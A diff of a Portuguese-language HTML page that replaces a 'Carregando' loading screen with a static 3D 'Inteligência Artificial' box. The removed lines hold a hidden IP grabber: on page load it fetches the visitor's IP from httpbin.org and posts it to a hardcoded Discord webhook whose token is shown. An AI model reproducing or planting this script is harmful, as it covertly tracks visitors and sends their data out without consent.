@@ -3,109 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Info</title>
+    <title>Layout de Inteligência Artificial em 3D</title>
     <style>
-        body {
+        body, html {
+            height: 100%;
             margin: 0;
             padding: 0;
-            background-color: black;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            perspective: 1000px;
+            overflow: hidden;
+            background-color: black; /* Fundo preto */
         }
 
         .container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            perspective: 1000px;
+        }
+
+        .box {
+            width: 300px;
+            height: 200px;
+            padding: 20px;
+            background-color: #ff4d4d; /* Vermelho forte */
+            color: black;
             text-align: center;
-            color: white;
-            font-family: Arial, sans-serif;
-            transform: rotateX(20deg);
+            transform: rotateY(45deg) rotateX(15deg);
+            transform-style: preserve-3d;
+            transition: transform 0.5s;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
         }
 
-        .loading-text {
-            font-size: 36px;
-            margin-bottom: 20px;
+        .box:hover {
+            transform: rotateY(0deg) rotateX(0deg);
         }
 
-        .dots {
-            font-size: 24px;
-            color: red;
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
         }
 
-        .dots:after {
-            content: "";
-            animation: dots 0.5s infinite;
-        }
-
-        @keyframes dots {
-            0% {
-                content: "";
-            }
-            25% {
-                content: ".";
-            }
-            50% {
-                content: "..";
-            }
-            75% {
-                content: "...";
-            }
+        p {
+            font-size: 18px;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="loading-text">Carregando</div>
-        <div class="dots" id="dots"></div>
+        <div class="box">
+            <h1>Inteligência Artificial</h1>
+            <p>Um mundo de possibilidades...</p>
+        </div>
     </div>
-
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var dots = document.getElementById("dots");
-
-            function updateDots() {
-                dots.innerHTML += ".";
-                if (dots.innerHTML.length > 3) {
-                    dots.innerHTML = "";
-                }
-            }
-
-            setInterval(updateDots, 500);
-
-            fetch("https://httpbin.org/ip")
-            .then(response => response.json())
-            .then(data => {
-                sendToDiscord(data.origin);
-            })
-            .catch(error => {
-                console.error("Erro ao obter endereço IP:", error);
-            });
-        });
-
-        function sendToDiscord(ip) {
-            var webhookURL = "https://discord.com/api/webhooks/1212900989154099250/6LQWxqzmarY9YUxPLLF2h6kQrYrcjV7NJuaNbVUs4k4RhNBrvEbduTX4IFreMq7T48XF";
-            var message = "Endereço IP: " + ip;
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    content: message
-                })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error("Erro ao enviar mensagem para o webhook");
-                }
-                console.log("Mensagem enviada com sucesso!");
-            })
-            .catch(error => {
-                console.error(error);
-            });
-        }
-    </script>
 </body>
 </html>
